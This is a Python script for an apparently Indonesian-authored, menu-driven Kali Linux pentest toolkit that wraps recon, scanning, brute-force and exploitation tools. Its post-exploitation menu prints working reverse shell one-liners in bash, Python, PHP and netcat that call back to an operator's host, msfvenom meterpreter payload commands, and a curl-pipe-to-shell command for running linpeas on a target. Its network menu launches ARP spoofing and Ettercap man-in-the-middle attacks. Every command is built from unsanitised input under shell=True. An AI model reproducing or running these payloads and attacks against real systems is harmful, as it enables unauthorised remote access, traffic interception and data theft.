#!/usr/bin/env python3
import os
import sys
import subprocess
import time
from datetime import datetime
import shutil

# Warna untuk output
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

# Banner ASCII dengan warna
def show_banner():
    print(BLUE + r"""
‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó ‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēó  ‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēó ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó
‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚ēö‚ēź‚ēź‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚ēĎ ‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚ēź‚ēź‚ēĚ
‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚ēĎ  ‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó
‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ ‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ  ‚Ėą‚Ėą‚ēĒ‚ēź‚Ėą‚Ėą‚ēó ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēĎ‚ēö‚ēź‚ēź‚ēź‚ēź‚Ėą‚Ėą‚ēĎ
‚Ėą‚Ėą‚ēĎ  ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ  ‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ  ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĎ
‚ēö‚ēź‚ēĚ  ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēĚ‚ēö‚ēź‚ēĚ  ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ  ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēĚ
    """ + RESET)
    print("="*60)
    print(GREEN + "RizkiAs Pentest Toolkit - Professional Edition" + RESET)
    print("="*60)
    print(f"Time Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("")

# Fungsi untuk membersihkan layar
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# Fungsi validasi input
def get_input(prompt, input_type=str, min_val=None, max_val=None):
    while True:
        try:
            user_input = input_type(input(prompt))
            if min_val is not None and user_input < min_val:
                raise ValueError(f"Minimal {min_val}")
            if max_val is not None and user_input > max_val:
                raise ValueError(f"Maksimal {max_val}")
            return user_input
        except ValueError as e:
            print(f"{RED}Input tidak valid: {e}{RESET}")

# Fungsi untuk mengecek tool dan install jika diperlukan
def check_and_install_tool(tool_name, package_name=None):
    if shutil.which(tool_name) is None:
        print(f"{RED}[!] Tool {tool_name} tidak ditemukan!{RESET}")
        install = input(f"{YELLOW}[?] Install {package_name or tool_name} sekarang? (y/n): {RESET}").strip().lower()
        if install == 'y':
            print(f"{YELLOW}[*] Menginstall {package_name or tool_name}...{RESET}")
            try:
                subprocess.run(f"sudo apt install -y {package_name or tool_name}", shell=True, check=True)
                print(f"{GREEN}[+] {package_name or tool_name} berhasil diinstall!{RESET}")
                return True
            except subprocess.CalledProcessError:
                print(f"{RED}[!] Gagal menginstall {package_name or tool_name}{RESET}")
                return False
        else:
            print(f"{RED}[!] Tool {tool_name} diperlukan. Silakan install manual.{RESET}")
            return False
    return True

# Fungsi untuk setup output directory
def setup_output_dir():
    # Buat folder utama jika belum ada
    if not os.path.exists('results'):
        os.mkdir('results')
    
    # Buat folder dengan tanggal hari ini
    today = datetime.now().strftime('%Y-%m-%d')
    today_dir = os.path.join('results', today)
    if not os.path.exists(today_dir):
        os.mkdir(today_dir)
    
    # Buat folder dengan timestamp
    timestamp = datetime.now().strftime('%H-%M-%S')
    session_dir = os.path.join(today_dir, timestamp)
    os.mkdir(session_dir)
    
    return session_dir

# Fungsi untuk generate nama file dengan timestamp
def generate_filename(base_name, extension="txt"):
    timestamp = datetime.now().strftime('%H-%M-%S')
    return f"{base_name}_{timestamp}.{extension}"

# Kategori 1: Reconnaissance
def reconnaissance_menu(session_dir):
    while True:
        clear_screen()
        print(f"\n{BLUE}[1] Reconnaissance Tools{RESET}")
        print("="*40)
        print("1. Whois Lookup")
        print("2. DNS Lookup (nslookup)")
        print("3. Subdomain Enumeration (sublist3r)")
        print("4. Email & Subdomain Harvester (theHarvester)")
        print("5. Tech Stack Scanner (whatweb)")
        print("6. Directory Brute Force (dirsearch)")
        print("7. Simple Port Scan (nmap -sn)")
        print("8. Kembali ke Menu Utama")
        
        choice = get_input("Pilih opsi: ", int, 1, 8)
        
        if choice == 1:
            target = input("Masukkan domain/IP: ")
            if not check_and_install_tool("whois"):
                continue
            output_file = os.path.join(session_dir, generate_filename(f"whois_{target.replace('.', '_')}"))
            with open(output_file, 'w') as f:
                subprocess.run(f"whois {target}", shell=True, stdout=f, stderr=subprocess.STDOUT)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 2:
            target = input("Masukkan domain: ")
            if not check_and_install_tool("nslookup", "dnsutils"):
                continue
            output_file = os.path.join(session_dir, generate_filename(f"nslookup_{target.replace('.', '_')}"))
            with open(output_file, 'w') as f:
                subprocess.run(f"nslookup {target}", shell=True, stdout=f, stderr=subprocess.STDOUT)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 3:
            domain = input("Masukkan domain: ")
            if not check_and_install_tool("sublist3r"):
                continue
            output_file = os.path.join(session_dir, generate_filename(f"subdomains_{domain}"))
            subprocess.run(f"sublist3r -d {domain} -o {output_file}", shell=True)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 4:
            domain = input("Masukkan domain: ")
            if not check_and_install_tool("theHarvester", "theharvester"):
                continue
            limit = input("Jumlah hasil (default 100): ") or "100"
            output_base = os.path.join(session_dir, f"theHarvester_{domain}_{datetime.now().strftime('%H-%M-%S')}")
            subprocess.run(f"theHarvester -d {domain} -l {limit} -b all -f {output_base}", shell=True)
            print(f"{GREEN}[+] Hasil disimpan di {output_base}.xml dan {output_base}.txt{RESET}")
        
        elif choice == 5:
            url = input("Masukkan URL: ")
            if not check_and_install_tool("whatweb"):
                continue
            output_file = os.path.join(session_dir, generate_filename(f"whatweb_{url.replace('://', '_').replace('/', '_')}"))
            with open(output_file, 'w') as f:
                subprocess.run(f"whatweb {url}", shell=True, stdout=f, stderr=subprocess.STDOUT)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 6:
            url = input("Masukkan URL: ")
            if not check_and_install_tool("dirsearch"):
                continue
            wordlist = input("Path wordlist (default /usr/share/dirb/wordlists/common.txt): ") or "/usr/share/dirb/wordlists/common.txt"
            output_file = os.path.join(session_dir, generate_filename(f"dirsearch_{url.replace('://', '_').replace('/', '_')}"))
            subprocess.run(f"dirsearch -u {url} -w {wordlist} -o {output_file}", shell=True)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 7:
            target = input("Masukkan target (IP/domain): ")
            if not check_and_install_tool("nmap"):
                continue
            output_file = os.path.join(session_dir, generate_filename(f"nmap_ping_{target.replace('.', '_')}"))
            with open(output_file, 'w') as f:
                subprocess.run(f"nmap -sn {target}", shell=True, stdout=f, stderr=subprocess.STDOUT)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 8:
            return

        input("\nTekan Enter untuk melanjutkan...")

# Kategori 2: Scanning/Enumeration
def scanning_menu(session_dir):
    while True:
        clear_screen()
        print(f"\n{BLUE}[2] Scanning & Enumeration Tools{RESET}")
        print("="*40)
        print("1. Full Nmap Scan")
        print("2. Nikto Web Server Scan")
        print("3. WPScan (WordPress)")
        print("4. Gobuster Path Brute-force")
        print("5. Amass Advanced Recon")
        print("6. HTTPX Check Live Web")
        print("7. Kembali ke Menu Utama")
        
        choice = get_input("Pilih opsi: ", int, 1, 7)
        
        if choice == 1:
            target = input("Masukkan target (IP/domain): ")
            if not check_and_install_tool("nmap"):
                continue
            output_file = os.path.join(session_dir, generate_filename(f"nmap_full_{target.replace('.', '_')}"))
            subprocess.run(f"nmap -sV -O -A -T4 {target} -oN {output_file}", shell=True)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 2:
            url = input("Masukkan URL: ")
            if not check_and_install_tool("nikto"):
                continue
            output_file = os.path.join(session_dir, generate_filename(f"nikto_{url.replace('://', '_').replace('/', '_')}"))
            with open(output_file, 'w') as f:
                subprocess.run(f"nikto -h {url}", shell=True, stdout=f, stderr=subprocess.STDOUT)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 3:
            url = input("Masukkan URL WordPress: ")
            if not check_and_install_tool("wpscan"):
                continue
            output_file = os.path.join(session_dir, generate_filename(f"wpscan_{url.replace('://', '_').replace('/', '_')}"))
            with open(output_file, 'w') as f:
                subprocess.run(f"wpscan --url {url} --enumerate p", shell=True, stdout=f, stderr=subprocess.STDOUT)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 4:
            url = input("Masukkan URL: ")
            if not check_and_install_tool("gobuster"):
                continue
            wordlist = input("Path wordlist (default /usr/share/dirb/wordlists/common.txt): ") or "/usr/share/dirb/wordlists/common.txt"
            output_file = os.path.join(session_dir, generate_filename(f"gobuster_{url.replace('://', '_').replace('/', '_')}"))
            with open(output_file, 'w') as f:
                subprocess.run(f"gobuster dir -u {url} -w {wordlist}", shell=True, stdout=f, stderr=subprocess.STDOUT)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 5:
            domain = input("Masukkan domain: ")
            if not check_and_install_tool("amass"):
                continue
            output_file = os.path.join(session_dir, generate_filename(f"amass_{domain}"))
            subprocess.run(f"amass enum -d {domain} -o {output_file}", shell=True)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 6:
            file = input("Masukkan path file berisi domain: ")
            if not check_and_install_tool("httpx"):
                continue
            output_file = os.path.join(session_dir, generate_filename("httpx_scan"))
            with open(output_file, 'w') as f:
                subprocess.run(f"httpx -l {file} -status-code -title", shell=True, stdout=f, stderr=subprocess.STDOUT)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 7:
            return

        input("\nTekan Enter untuk melanjutkan...")

# Kategori 3: Exploitation
def exploitation_menu(session_dir):
    while True:
        clear_screen()
        print(f"\n{BLUE}[3] Exploitation Tools{RESET}")
        print("="*40)
        print("1. SQLMap (SQL Injection)")
        print("2. XSStrike (XSS)")
        print("3. Commix (Command Injection)")
        print("4. Hydra (Bruteforce Login)")
        print("5. WFuzz (Parameter Fuzzing)")
        print("6. Metasploit Framework")
        print("7. BurpSuite (Manual)")
        print("8. Kembali ke Menu Utama")
        
        choice = get_input("Pilih opsi: ", int, 1, 8)
        
        if choice == 1:
            url = input("Masukkan URL target: ")
            if not check_and_install_tool("sqlmap"):
                continue
            output_file = os.path.join(session_dir, generate_filename(f"sqlmap_{url.replace('://', '_').replace('/', '_')}"))
            with open(output_file, 'w') as f:
                subprocess.run(f"sqlmap -u {url} --batch --risk=3 --level=5", shell=True, stdout=f, stderr=subprocess.STDOUT)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 2:
            url = input("Masukkan URL target: ")
            if not check_and_install_tool("xssstrike"):
                continue
            output_file = os.path.join(session_dir, generate_filename(f"xssstrike_{url.replace('://', '_').replace('/', '_')}"))
            with open(output_file, 'w') as f:
                subprocess.run(f"xssstrike -u {url}", shell=True, stdout=f, stderr=subprocess.STDOUT)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 3:
            url = input("Masukkan URL target: ")
            if not check_and_install_tool("commix"):
                continue
            output_file = os.path.join(session_dir, generate_filename(f"commix_{url.replace('://', '_').replace('/', '_')}"))
            with open(output_file, 'w') as f:
                subprocess.run(f"commix -u {url}", shell=True, stdout=f, stderr=subprocess.STDOUT)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 4:
            target = input("Target (ssh://, ftp://, http://): ")
            if not check_and_install_tool("hydra"):
                continue
            username = input("Username (atau file): ")
            password_list = input("Path password list: ")
            service = input("Service (ssh, ftp, http-form-post, etc): ")
            output_file = os.path.join(session_dir, generate_filename(f"hydra_{target.replace('://', '_')}"))
            with open(output_file, 'w') as f:
                subprocess.run(f"hydra -L {username} -P {password_list} {target} {service}", shell=True, stdout=f, stderr=subprocess.STDOUT)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 5:
            url = input("Masukkan URL (gunakan FUZZ): ")
            if not check_and_install_tool("wfuzz"):
                continue
            wordlist = input("Path wordlist: ")
            output_file = os.path.join(session_dir, generate_filename(f"wfuzz_{url.replace('://', '_').replace('/', '_')}"))
            with open(output_file, 'w') as f:
                subprocess.run(f"wfuzz -c -z file,{wordlist} --hc 404 {url}", shell=True, stdout=f, stderr=subprocess.STDOUT)
            print(f"{GREEN}[+] Hasil disimpan di {output_file}{RESET}")
        
        elif choice == 6:
            if not check_and_install_tool("msfconsole", "metasploit-framework"):
                continue
            print(f"\n{YELLOW}[!] Memulai Metasploit...{RESET}")
            subprocess.Popen("msfconsole", shell=True)
        
        elif choice == 7:
            if not check_and_install_tool("burpsuite"):
                continue
            print(f"\n{YELLOW}[!] Membuka BurpSuite...{RESET}")
            subprocess.Popen("burpsuite", shell=True)
        
        elif choice == 8:
            return

        input("\nTekan Enter untuk melanjutkan...")

# Kategori 4: Post-Exploitation
def post_exploitation_menu(session_dir):
    while True:
        clear_screen()
        print(f"\n{BLUE}[4] Post-Exploitation Tools{RESET}")
        print("="*40)
        print("1. Netcat Reverse Shell Helper")
        print("2. MSFVenom Payload Builder")
        print("3. Privilege Escalation Checker")
        print("4. Kembali ke Menu Utama")
        
        choice = get_input("Pilih opsi: ", int, 1, 4)
        
        if choice == 1:
            print(f"\n{YELLOW}[ Netcat Reverse Shell ]{RESET}")
            lhost = input("Local IP: ")
            lport = input("Local Port: ")
            print("\nPilih shell type:")
            print("1. Bash")
            print("2. Python")
            print("3. PHP")
            print("4. Netcat")
            
            shell_choice = get_input("Pilihan: ", int, 1, 4)
            shells = {
                1: f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                2: f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                3: f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                4: f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
            }
            print(f"\n{GREEN}[+] Gunakan payload berikut:\n{shells[shell_choice]}{RESET}")
            print(f"\n{YELLOW}[!] Jalankan listener di local machine:\nnc -lnvp {lport}{RESET}")
            
            # Simpan payload ke file
            output_file = os.path.join(session_dir, generate_filename("reverse_shell", "txt"))
            with open(output_file, 'w') as f:
                f.write(shells[shell_choice] + f"\n\nListener command: nc -lnvp {lport}")
            print(f"{GREEN}[+] Payload disimpan di {output_file}{RESET}")
        
        elif choice == 2:
            print(f"\n{YELLOW}[ MSFVenom Payload Generator ]{RESET}")
            lhost = input("Local IP: ")
            lport = input("Local Port: ")
            print("\nPilih payload type:")
            print("1. Windows (exe)")
            print("2. Linux (elf)")
            print("3. Android (apk)")
            print("4. Web (php)")
            
            payload_choice = get_input("Pilihan: ", int, 1, 4)
            payloads = {
                1: f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > payload.exe",
                2: f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > payload.elf",
                3: f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > payload.apk",
                4: f"msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw > payload.php"
            }
            print(f"\n{GREEN}[+] Jalankan perintah berikut:\n{payloads[payload_choice]}{RESET}")
            print(f"\n{YELLOW}[!] Jangan lupa setup listener di Metasploit!{RESET}")
            
            # Simpan perintah ke file
            output_file = os.path.join(session_dir, generate_filename("msfvenom", "txt"))
            with open(output_file, 'w') as f:
                f.write(payloads[payload_choice] + "\n\nSetup listener:\nmsfconsole\nuse exploit/multi/handler\nset payload <PAYLOAD_TYPE>\nset LHOST <IP>\nset LPORT <PORT>\nexploit")
            print(f"{GREEN}[+] Perintah disimpan di {output_file}{RESET}")
        
        elif choice == 3:
            print(f"\n{YELLOW}[ Privilege Escalation Checker ]{RESET}")
            print("1. LinPeas (Linux)")
            print("2. WinPeas (Windows)")
            esc_choice = get_input("Pilihan: ", int, 1, 2)
            
            output_file = os.path.join(session_dir, generate_filename("privilege_escalation", "txt"))
            
            if esc_choice == 1:
                command = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
                print(f"\n{GREEN}[+] Download dan jalankan di target:\n{command}{RESET}")
                with open(output_file, 'w') as f:
                    f.write(command)
            else:
                command = "Invoke-WebRequest https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -OutFile winpeas.bat"
                print(f"\n{GREEN}[+] Download dan jalankan di target:\n{command}{RESET}")
                with open(output_file, 'w') as f:
                    f.write(command)
            
            print(f"{GREEN}[+] Perintah disimpan di {output_file}{RESET}")
        
        elif choice == 4:
            return

        input("\nTekan Enter untuk melanjutkan...")

# Kategori 5: Pelengkap/Jaringan
def network_menu(session_dir):
    while True:
        clear_screen()
        print(f"\n{BLUE}[5] Network & Additional Tools{RESET}")
        print("="*40)
        print("1. OWASP ZAP")
        print("2. ARP Spoofing + Wireshark")
        print("3. Ettercap (MITM)")
        print("4. Kembali ke Menu Utama")
        
        choice = get_input("Pilih opsi: ", int, 1, 4)
        
        if choice == 1:
            if not check_and_install_tool("zap.sh", "zaproxy"):
                continue
            print(f"\n{YELLOW}[!] Membuka OWASP ZAP...{RESET}")
            subprocess.Popen("zap.sh", shell=True)
        
        elif choice == 2:
            print(f"\n{YELLOW}[ ARP Spoofing + Packet Sniffing ]{RESET}")
            target = input("Target IP: ")
            gateway = input("Gateway IP: ")
            interface = input("Network Interface (eth0/wlan0): ") or "eth0"
            
            if not check_and_install_tool("arpspoof", "dsniff") or not check_and_install_tool("wireshark"):
                continue
            
            print(f"\n{YELLOW}[!] Memulai ARP spoofing...{RESET}")
            p1 = subprocess.Popen(f"arpspoof -i {interface} -t {target} {gateway}", shell=True)
            p2 = subprocess.Popen(f"arpspoof -i {interface} -t {gateway} {target}", shell=True)
            
            print(f"{YELLOW}[!] Memulai Wireshark...{RESET}")
            subprocess.Popen(f"wireshark -i {interface} -k", shell=True)
            print(f"\n{YELLOW}[!] Tekan Enter di terminal ini setelah selesai untuk menghentikan serangan{RESET}")
            input()
            
            print(f"{YELLOW}[!] Menghentikan serangan...{RESET}")
            p1.terminate()
            p2.terminate()
            subprocess.run("pkill arpspoof", shell=True)
            
            # Simpan konfigurasi serangan
            output_file = os.path.join(session_dir, generate_filename("arp_spoofing", "txt"))
            with open(output_file, 'w') as f:
                f.write(f"Target IP: {target}\n")
                f.write(f"Gateway IP: {gateway}\n")
                f.write(f"Interface: {interface}\n")
                f.write(f"\nCommands used:\narpspoof -i {interface} -t {target} {gateway}\narpspoof -i {interface} -t {gateway} {target}")
            print(f"{GREEN}[+] Konfigurasi serangan disimpan di {output_file}{RESET}")
        
        elif choice == 3:
            if not check_and_install_tool("ettercap", "ettercap-graphical"):
                continue
            print(f"\n{YELLOW}[!] Memulai Ettercap (MITM)...{RESET}")
            interface = input("Network Interface (eth0/wlan0): ") or "eth0"
            target = input("Target IP (format: IP/MAC): ")
            gateway = input("Gateway IP (format: IP/MAC): ")
            output_file = os.path.join(session_dir, generate_filename("ettercap", "txt"))
            with open(output_file, 'w') as f:
                f.write(f"Interface: {interface}\n")
                f.write(f"Target: {target}\n")
                f.write(f"Gateway: {gateway}\n")
                f.write(f"\nCommand: ettercap -T -i {interface} -M arp:remote /{gateway}// /{target}//")
            subprocess.run(f"ettercap -T -i {interface} -M arp:remote /{gateway}// /{target}//", shell=True)
            print(f"{GREEN}[+] Konfigurasi disimpan di {output_file}{RESET}")
        
        elif choice == 4:
            return

        input("\nTekan Enter untuk melanjutkan...")

# Main Menu
def main():
    # Setup output directory
    session_dir = setup_output_dir()
    print(f"{GREEN}[+] Output akan disimpan di: {session_dir}{RESET}")
    
    while True:
        clear_screen()
        show_banner()
        print(f"{BLUE} Main Menu {RESET}".center(60, "="))
        print("1. Reconnaissance Tools")
        print("2. Scanning & Enumeration")
        print("3. Exploitation Tools")
        print("4. Post-Exploitation")
        print("5. Network & Additional Tools")
        print("6. Exit")
        print("="*60)
        
        choice = get_input("\nPilih kategori: ", int, 1, 6)
        
        if choice == 1:
            reconnaissance_menu(session_dir)
        elif choice == 2:
            scanning_menu(session_dir)
        elif choice == 3:
            exploitation_menu(session_dir)
        elif choice == 4:
            post_exploitation_menu(session_dir)
        elif choice == 5:
            network_menu(session_dir)
        elif choice == 6:
            print(f"\n{YELLOW}[!] Keluar dari RizkiAs Toolkit...{RESET}")
            sys.exit(0)

if __name__ == "__main__":
    # Cek environment Kali Linux
    if not os.path.exists('/etc/os-release'):
        print(f"{RED}[ERROR] Tools ini harus dijalankan di Kali Linux{RESET}")
        sys.exit(1)
    
    with open('/etc/os-release') as f:
        if 'Kali' not in f.read():
            print(f"{RED}[ERROR] Tools ini dirancang khusus untuk Kali Linux{RESET}")
            sys.exit(1)
    
    # Cek akses root
    if os.geteuid() != 0:
        print(f"{RED}[ERROR] Tools ini membutuhkan akses root!{RESET}")
        print(f"{YELLOW}Jalankan dengan: sudo ./RizkiAs.py{RESET}")
        sys.exit(1)
    
    main()